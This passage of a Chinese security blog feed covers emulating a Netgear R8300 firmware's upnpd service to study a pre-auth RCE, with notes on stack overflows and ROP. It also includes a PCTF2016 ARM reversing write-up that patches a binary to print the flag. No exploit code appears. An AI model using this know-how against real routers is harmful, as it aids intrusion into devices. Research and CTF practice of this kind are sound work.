class="hljs-string">_</span>|<span class="hljs-string">    \__,_</span>|<span class="hljs-string">  \__</span>|<br><br>                Welcome to the Firmware Analysis Toolkit - v0.3<br>    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation<br>                  By Attify - https://attify.com  |<span class="hljs-string"> @attifyme</span><br><span class="hljs-string">    </span><br><span class="hljs-string">[+] Firmware: R8300-V1.0.2.130_1.0.99.zip</span><br><span class="hljs-string">[+] Extracting the firmware...</span><br><span class="hljs-string">[+] Image ID: 1</span><br><span class="hljs-string">[+] Identifying architecture...</span><br><span class="hljs-string">[+] Architecture: armel</span><br><span class="hljs-string">[+] Building QEMU disk image...</span><br><span class="hljs-string">[+] Setting up the network connection, please standby...</span><br><span class="hljs-string">[+] Network interfaces: []</span><br><span class="hljs-string">[+] All set! Press ENTER to run the firmware...</span><br><span class="hljs-string">[+] When running, press Ctrl + A X to terminate qemu</span><br></code></pre></td></tr></table></figure><p>没有提供ip和端口的话，一般就不能自动处理了。</p><h3 id="qemu-user-mode模拟"><a href="#qemu-user-mode模拟" class="headerlink" title="qemu user mode模拟"></a>qemu user mode模拟</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo chroot . .<span class="hljs-regexp">/qemu-arm-static  ./u</span>sr<span class="hljs-regexp">/sbin/u</span>pnpd<br>或者 <br>sudo chroot . .<span class="hljs-regexp">/qemu-arm-static --strace ./u</span>sr<span class="hljs-regexp">/sbin/u</span>pnpd<br></code></pre></td></tr></table></figure><blockquote><p>-strace              QEMU_STRACE       log system calls</p></blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">33359 </span><span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;/var/run/upnpd.pid&quot;</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="hljs-number">0666</span>) = -<span class="hljs-number">1</span> errno=<span class="hljs-number">2</span> (No such file <span class="hljs-keyword">or</span> directory)<br></code></pre></td></tr></table></figure><p>查看文件结构后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">4</span> mrbelieve mrbelieve     <span class="hljs-number">4096</span> Oct <span class="hljs-number">20</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> tmp<br><span class="hljs-attribute">drwxrwxr</span>-x <span class="hljs-number">10</span> mrbelieve mrbelieve     <span class="hljs-number">4096</span> Dec <span class="hljs-number">12</span>  <span class="hljs-number">2018</span> usr<br><span class="hljs-attribute">lrwxrwxrwx</span>  <span class="hljs-number">1</span> mrbelieve mrbelieve        <span class="hljs-number">7</span> Dec <span class="hljs-number">12</span>  <span class="hljs-number">2018</span> var -&gt; tmp/var<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">8</span> mrbelieve mrbelieve    <span class="hljs-number">24576</span> Dec <span class="hljs-number">12</span>  <span class="hljs-number">2018</span> www<br></code></pre></td></tr></table></figure><p>通过<code>mkdir -p ./tmp/var/run</code>解决，再次运行后显示大量</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/nvram&quot;</span>,O_RDWR) = <span class="hljs-number">-1</span> errno=<span class="hljs-number">2</span> (No such <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">directory</span>)<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/dev/</span>nvram: No such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-regexp">/dev/</span>nvram: No such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-regexp">/dev/</span>nvram: No such <span class="hljs-keyword">file</span> or directory<br>open: No such <span class="hljs-keyword">file</span> or directory<br></code></pre></td></tr></table></figure><blockquote><p>均与<code>NVRAM</code>有关，该错误在进行<code>IoT</code>设备仿真时会经常遇到。<code>NVRAM</code>中保存了设备的一些配置信息，而程序运行时需要读取配置信息，由于缺少对应的外设，因此会报错。一种常见的解决方案是<code>&quot;劫持&quot;</code>与<code>NVRAM</code>读写相关的函数，通过软件的方式来提供相应的配置。</p><p>网上有很多类似的模拟<code>NVRAM</code>行为的库，而<code>Firmadyne</code>框架提供的<code>libnvram</code>库：支持很多常见的<code>api</code>，对很多嵌入式设备进行了适配，同时还会解析固件中默认的一些<code>NVRAM</code>配置，实现方式比较优雅。采用该库，往往只需要做很少的改动，甚至无需改动，就可以满足需求。</p></blockquote><p>libnvram<a href="https://github.com/firmadyne/libnvram">文档</a>。编译好后直接放在squashfs-root</p><blockquote><p>编译可以使用buildroot，make menuconfig记得将”Target Architecture”改成ARM(little endian) ，最后使用<code>buildroot/output/host/usr/bin/arm-linux-gcc -Wall -fPIC -shared nvram.c -o libnvram.so.armel -nostdlib</code>  即可</p><p>具体选项来自libnvram的Makefile</p></blockquote><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">sem_lock:</span> Triggering NVRAM initialization!<br><span class="hljs-symbol">nvram_init:</span> Initializing NVRAM...<br><span class="hljs-symbol">sem_get:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore <span class="hljs-keyword">key</span>!<br><span class="hljs-symbol">sem_lock:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore!<br><span class="hljs-symbol">sem_get:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore <span class="hljs-keyword">key</span>!<br><span class="hljs-symbol">sem_unlock:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore!<br><span class="hljs-symbol">nvram_init:</span> Unable <span class="hljs-keyword">to</span> mount tmpfs <span class="hljs-keyword">on</span> mount point /firmadyne/libnvram/!<br><span class="hljs-symbol">sem_get:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore <span class="hljs-keyword">key</span>!<br><span class="hljs-symbol">sem_lock:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore!<br><span class="hljs-symbol">sem_get:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore <span class="hljs-keyword">key</span>!<br><span class="hljs-symbol">sem_unlock:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore!<br><span class="hljs-symbol">nvram_get_buf:</span> Unable <span class="hljs-keyword">to</span> open <span class="hljs-keyword">key</span>: /firmadyne/libnvram/upnpd_debug_level!<br></code></pre></td></tr></table></figure><p>这样可以开始调nvram的配置了</p><p>这样我就实在调不来了。。。<strong>最终死在lan_ipaddr上面，怎么设置都不对</strong>。。。</p><h3 id="qemu-system-mode模拟"><a href="#qemu-system-mode模拟" class="headerlink" title="qemu system mode模拟"></a>qemu system mode模拟</h3><p><strong>过于麻烦，本质是起一个完整虚拟机然后再跑这个服务的样子（而且虚拟机很慢）</strong></p><p>下面是ubuntu20环境，attifyOS还未测试成功过。</p><p>新建一个tap接口，并配置ip</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tunctl -t tap<span class="hljs-number">0</span> -u `whoami`<br><br><span class="hljs-attribute">sudo</span> ifconfig tap<span class="hljs-number">0</span> <span class="hljs-number">192.168.2.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><blockquote><p>The tap networking backend makes use of a tap networking device in the host. It offers very good performance and can be configured to create virtually any type of network topology. Unfortunately, it requires configuration of that network topology in the host which tends to be different depending on the operating system you are using.</p></blockquote><p>然后把<code>vmlinuz-3.2.0-4-vexpress</code>， <code>initrd.img-3.2.0-4-vexpress -drive</code>和<code>debian_wheezy_armhf_standard.qcow2</code>放到当前目录下。<a href="https://people.debian.org/~aurel32/qemu/armhf/">前面几个东西的下载地址</a></p><blockquote><p>armel and armhf</p><p>The ARM EABI (<strong>armel</strong>) port targets a range of older 32-bit ARM devices, particularly those used in NAS hardware and a variety of <em>plug computers. The newer ARM hard-float (*</em>armhf**) port supports newer, more powerful 32-bit devices using version 7 of the ARM architecture specification.</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-system-arm -M vexpress-a<span class="hljs-number">9</span> -kernel vmlinuz-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-vexpress -initrd initrd.img-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow<span class="hljs-number">2</span> -append <span class="hljs-string">&quot;root=/dev/mmcblk0p2&quot;</span> -net nic -net tap,ifname=tap<span class="hljs-number">0</span>,script=no,downscript=no -nographic<br></code></pre></td></tr></table></figure><p>关于这个<code>root=/dev/mmcblk0p2</code>，我自己尝试直接将文件夹放进去会起不来。。。我的解决方法是先这样跑然后通过scp传进去</p><p><code>cp -r root@192.168.2.2  ./squashfs-root /home/user/squashfs-root</code></p><p>等待……</p><p>启动之后</p><blockquote><ul><li>Root password:  root</li><li>User account:   user</li><li>User password:  user</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@debian-armhf:/home/user<span class="hljs-comment"># ifconfig eth0 192.168.2.2/24</span><br>root@debian-armhf:/home/user<span class="hljs-comment"># ifconfig</span><br>eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  <br>          inet addr:192.168.2.2  Bcast:192.168.2.255  Mask:255.255.255.0<br>          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:11 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1000 <br>          RX bytes:0 (0.0 B)  TX bytes:2178 (2.1 KiB)<br>          Interrupt:47 <br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          inet6 addr: ::1/128 Scope:Host<br>          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)<br>root@debian-armhf:/home/user<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">root@debian-armhf:/home/user<span class="hljs-comment"># mount -t proc /proc ./squashfs-root/proc</span><br>root@debian-armhf:/home/user<span class="hljs-comment"># mount -o bind /dev ./squashfs-root/dev</span><br>root@debian-armhf:/home/user<span class="hljs-comment"># chroot ./squashfs-root/ sh #切换根目录后执行新目录结构下的 sh shell</span><br><br><br>BusyBox v1.7.2 (2018-12-13 12:34:27 CST) built-in shell (ash)<br>Enter <span class="hljs-string">&#x27;help&#x27;</span> <span class="hljs-keyword">for</span> a list of built-in commands.<br><br>uid=0 gid=0(root)<br><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://zhuanlan.zhihu.com/p/61278842?from_voters_page=true"><strong>PS:</strong></a> 使用 chroot 后，系统读取的是新根下的目录和文件，也就是固件的目录和文件 chroot 默认不会切换 /dev 和 /proc, 因此切换根目录前需要先挂载这两个目录</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">```<br><br>&gt; -v, --invert-match        select non-matching lines<br><br>没有任何信息就<span class="hljs-built_in">exit</span>了<br><br>==咋调试出是open的问题的。。。==<br><br>创建了/var/run之后，就提示<br><br></code></pre></td></tr></table></figure><p>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment">## 分析参考</span><br><br>- https:<span class="hljs-regexp">//ssd</span>-disclosure.com/ssd-advisory-netgear-nighthawk-r830<span class="hljs-number">0</span>-upnpd-preauth-rce/<br>- https:<span class="hljs-regexp">//pap</span>er.seebug.org/<span class="hljs-number">1311</span>/<span class="hljs-comment">#1</span><br><br>- https:<span class="hljs-regexp">//</span>cq674350529.github.io/<span class="hljs-number">2020</span>/09/<span class="hljs-number">16</span>/PSV-<span class="hljs-number">2020</span>-<span class="hljs-number">0211</span>-Netgear-R830<span class="hljs-number">0</span>-UPnP%E6%A<span class="hljs-number">0</span>%88%E6%BA%A2%E5%87%BA%E6%BC%<span class="hljs-number">8</span>F%E6%B4%<span class="hljs-number">9</span>E%E5%88%86%E6%<span class="hljs-number">9</span>E%90/<br><br><span class="hljs-comment">### 分析总结</span><br><br><span class="hljs-comment">#### PC寄存器在arm中的作用</span><br><br>Program Counter 存储下一条程序指令的地址。顺序执行的情况是存储当前地址+<span class="hljs-number">4</span><br><br><span class="hljs-comment">#### 可用rasm2工具翻译汇编指令到机器指令</span><br><br>例子：<br><br></code></pre></td></tr></table></figure><p>0030a0e1</p><pre><code>这样可以在ida Patch program - Change byte里使用#### 多关注较危险函数strcpy，等&gt; strcpy拷贝的时候，如果n &lt; src的长度，那只是将src的前几个字符复制到dest的前n个字符里，不会自动添加`\x00`。而如果src小于n，则会自动填充`\x00`到dest直至复制完未初始化的空间#### 函数与漏洞点之间路径较短栈上数据不会发生太大变化，可以复用填充的rop gadgets#### arm栈溢出之后好像可以一路覆盖到n个寄存器（有待详细确认## 参考分析参考- https://paper.seebug.org/1311/#1- https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/[qemu部分参考](https://paper.seebug.org/480/)</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PCTF2016：Confused ARM 调试记录</title>
    <link href="/2020/10/09/PCTF2016%EF%BC%9AConfused%20ARM%20%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/10/09/PCTF2016%EF%BC%9AConfused%20ARM%20%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>结合书《CTF特训营》IoT篇看最佳</p><h2 id="0x01-静态分析"><a href="#0x01-静态分析" class="headerlink" title="0x01 静态分析"></a>0x01 静态分析</h2><p>指定处理器类型为ARM little-endian，不然</p><p>![image-20201009103732001](PCTF2016：Confused ARM 调试记录/image-20201009103732001.png)</p><p>正常打开之后先看看DCD部分</p><blockquote><p>DCD：数据定义（ Data Definition ）伪指令<br>一般用于为特定的数据分配存储单元，同时可完成已分配存储单元的初始化。</p><h3 id="语法格式："><a href="#语法格式：" class="headerlink" title="语法格式："></a>语法格式：</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">标号 <span class="hljs-meta">DCD</span>（或 <span class="hljs-meta">DCDU</span>） 表达式<br></code></pre></td></tr></table></figure><p>DCD（或 DCDU）伪指令用于分配一片连续的字存储单元并用指定的表达式初始化。其中表达式可以为程序标号或数字表达式。 DCD 也可用 “ &amp;” 代替。</p><p>用 DCD 分配的字存储单元是字对齐的，而用 DCDU 分配的字存储单元并不严格字对齐。</p><h3 id="实例（STM32-启动文件）："><a href="#实例（STM32-启动文件）：" class="headerlink" title="实例（STM32 启动文件）："></a>实例（STM32 启动文件）：</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__Vectors       DCD     __initial_sp               <span class="hljs-comment">; Top of Stack</span><br>                DCD     Reset_Handler              <span class="hljs-comment">; Reset Handler</span><br>                DCD     NMI_Handler                <span class="hljs-comment">; NMI Handler</span><br>                DCD     HardFault_Handler          <span class="hljs-comment">; Hard Fault Handler</span><br>                DCD     MemManage_Handler          <span class="hljs-comment">; MPU Fault Handler</span><br>                DCD     <span class="hljs-keyword">BusFault_Handler </span>          <span class="hljs-comment">; Bus Fault Handler</span><br>                DCD     UsageFault_Handler         <span class="hljs-comment">; Usage Fault Handler</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     SVC_Handler                <span class="hljs-comment">; SVCall Handler</span><br>                DCD     DebugMon_Handler           <span class="hljs-comment">; Debug Monitor Handler</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     PendSV_Handler             <span class="hljs-comment">; PendSV Handler</span><br>                DCD     SysTick_Handler            <span class="hljs-comment">; SysTick Handler</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/GyForever1004/p/8893789.html">来源</a></p></blockquote><p>所以第二个即为Reset handler，即<code>0x8000101</code></p><blockquote><p>The <strong>reset handler</strong> contains program code that is executed as soon as the processor exits from <strong>reset</strong>. In some cases, it contains some hardware initialization.</p></blockquote><p>实际地址为<code>0x8000100</code></p><blockquote><p>These vectors have LSB set to 1 to indicate that the exceptions handlers are to be executed with Thumb instructions</p></blockquote><p>另一种判断指令集为thumb的方法</p><blockquote><p><a href="https://eternalsakura13.com/2018/01/18/arm1/">来源</a></p><p>这有一段指令，判断出目前是thumb指令集的</p><p><a href="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/bDfa164Gm2.png?imageslim">![mark](PCTF2016：Confused ARM 调试记录/bDfa164Gm2.png)</a></p><p>（图来自sakura博客，与confused arm无关）</p><p>![mark](PCTF2016：Confused ARM 调试记录/L44GbeBb0g.png)</p><ul><li>Edit-&gt;segments-&gt;change segment register value(快捷键ALT+G)</li></ul></blockquote><p>按下ALT+G，T的value 为0x0，就是指定为ARM指令集，设定为0x1，就是thumb指令集</p><p>然后在<code>0x8000100</code>处按C转换成code</p><p>![image-20201009153839279](PCTF2016：Confused ARM 调试记录/image-20201009153839279.png)</p><p>然后我们跟随<code>0x8000100</code>这个程序入口开始，一路跳转到<code>0x8001084</code></p><p>![image-20201009154947339](PCTF2016：Confused ARM 调试记录/image-20201009154947339.png)</p><p>多选然后转换成hex</p><p>![image-20201009155719385](PCTF2016：Confused ARM 调试记录/image-20201009155719385.png)</p><p><code>0x40000000</code>和<code>0x20000000</code>，前者是特殊功能寄存器的基地址，后者是sram的起始地址</p><p>将这些地址添加为segment，在Edit-&gt;Segments-&gt;Create segemt </p><p>![image-20201009160159665](PCTF2016：Confused ARM 调试记录/image-20201009160159665.png)</p><p>SRAM部分同上，</p><p>然后在汇编中对这地址按O</p><p>![image-20201009160319480](PCTF2016：Confused ARM 调试记录/image-20201009160319480.png)</p><p>![image-20201009160429796](PCTF2016：Confused ARM 调试记录/image-20201009160429796.png)</p><p>然后在伪代码中再按一次F5刷新</p><p>![image-20201009160509472](PCTF2016：Confused ARM 调试记录/image-20201009160509472.png)</p><p>随后在这些疑似数组的地方用如下方式进行转换</p><p>![image-20201009160758788](PCTF2016：Confused ARM 调试记录/image-20201009160758788.png)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">sub_8001084</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// r0</span><br>  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// r0</span><br><br>  v1 = sub_8000A00(a1);<br>  v2 = sub_80006A4(v1);<br>  sub_80007F0(v2);<br>  sub_8000A50(<span class="hljs-number">0x1C200</span>);<br>  sub_8000AA8(&amp;USART1, <span class="hljs-number">0x40</span>);<br>  sub_8000560(byte_2000000C, &amp;unk_2000026C);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( unk_20000000 )<br>    &#123;<br>      sub_8000BA4(<br>        <span class="hljs-string">&quot;Key is :0x%08x,0x%08x,0x%08x,0x%08x\r\n&quot;</span>,<br>        byte_2000000C[<span class="hljs-number">0</span>],<br>        byte_2000000C[<span class="hljs-number">1</span>],<br>        byte_2000000C[<span class="hljs-number">2</span>],<br>        byte_2000000C[<span class="hljs-number">3</span>]);<br>      unk_20000000 = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( !sub_80007E2(<span class="hljs-number">1073809408</span>, <span class="hljs-number">2</span>) )<br>    &#123;<br>      sub_800055C(byte_2000000C, &amp;unk_2000026C);<br>      sub_8000248(&amp;unk_2000001C, byte_2000031C);<br>      sub_8000AA8(&amp;USART1, <span class="hljs-number">64</span>);<br>      sub_8000BA4(<br>        <span class="hljs-string">&quot;Fl4g 1s :PCTF&#123;%08x%08x%08x%08x&#125;\r\n&quot;</span>,<br>        byte_2000031C[<span class="hljs-number">0</span>],<br>        byte_2000031C[<span class="hljs-number">1</span>],<br>        byte_2000031C[<span class="hljs-number">2</span>],<br>        byte_2000031C[<span class="hljs-number">3</span>]);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-动态调试"><a href="#0x02-动态调试" class="headerlink" title="0x02 动态调试"></a>0x02 动态调试</h2><p>参考书459页进行配置</p><blockquote><p>如果load hex之后提示no write permission，请按照462页的工程设置界面，将最下面的CPU DLL, Driver DLl, Dialog DLL和Parameter对照一致设置好就行</p></blockquote><p>按照书上改名过后</p><p>![image-20201010091446144](PCTF2016：Confused ARM 调试记录/image-20201010091446144.png)</p><p>资料可参考<a href="https://blog.csdn.net/weixin_40117614/article/details/93018940">这儿</a></p><p>==打patch为0C 4A，改成0B 4A 理解不能QwQ，后面的打patch也理解不能QwQ==</p><p>改checksum，可用以下脚本计算，<a href="https://blog.csdn.net/qq_28840013/article/details/84143501">来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">DD</span>):</span><br>    length=<span class="hljs-built_in">len</span>(DD)  <span class="hljs-comment">#求长度</span><br><br>    <span class="hljs-comment">#创建一个list，将传入的str的每两个数合在一起，再求和</span><br>    list1=[]<br>    <span class="hljs-keyword">if</span>(length%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>):    <span class="hljs-comment">#如果str长度为单数，则抛出错误</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] 数据长度有误&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:   <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, length, <span class="hljs-number">2</span>):  <span class="hljs-comment">#range（开始，结束-1，每次加多少）  这里即0——length-1  每次循环i+2</span><br>            hex_digit=DD[i:i + <span class="hljs-number">2</span>]      <span class="hljs-comment">#将传入的str的每两个数合在一起</span><br>            list1.append(<span class="hljs-string">&#x27;0x&#x27;</span>+hex_digit)    <span class="hljs-comment">#再每个字符前+0x  但是它仍然是字符，但更便于下面通过int(list1[i], 16)转换成16进制</span><br>    <span class="hljs-built_in">print</span>(list1)<br><br>    <span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(length/<span class="hljs-number">2</span>)):   <span class="hljs-comment">#求和</span><br>        <span class="hljs-built_in">sum</span>=<span class="hljs-built_in">int</span>(list1[i], <span class="hljs-number">16</span>)+<span class="hljs-built_in">sum</span>      <span class="hljs-comment">#int(list1[i], 16)将16进制转换成10进制 int类型</span><br>    <span class="hljs-built_in">sum</span>=<span class="hljs-built_in">sum</span>%<span class="hljs-number">256</span><br>    <span class="hljs-built_in">sum</span>=<span class="hljs-number">256</span>-<span class="hljs-built_in">sum</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;校验码: &#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">sum</span>))   <span class="hljs-comment">#将sum和结果转换成16进制  hex(sum)</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    DD=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入HEX文件数据记录（校验值除外）：&quot;</span>)   <span class="hljs-comment">#input接收参数为str类型</span><br>    check(DD)<br></code></pre></td></tr></table></figure><p>然后MDK里reload之后，run就可以了</p><p>![image-20201010155940502](PCTF2016：Confused ARM 调试记录/image-20201010155940502.png)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>c++ static的作用</title>
    <link href="/2020/09/23/c++%20static%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2020/09/23/c++%20static%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
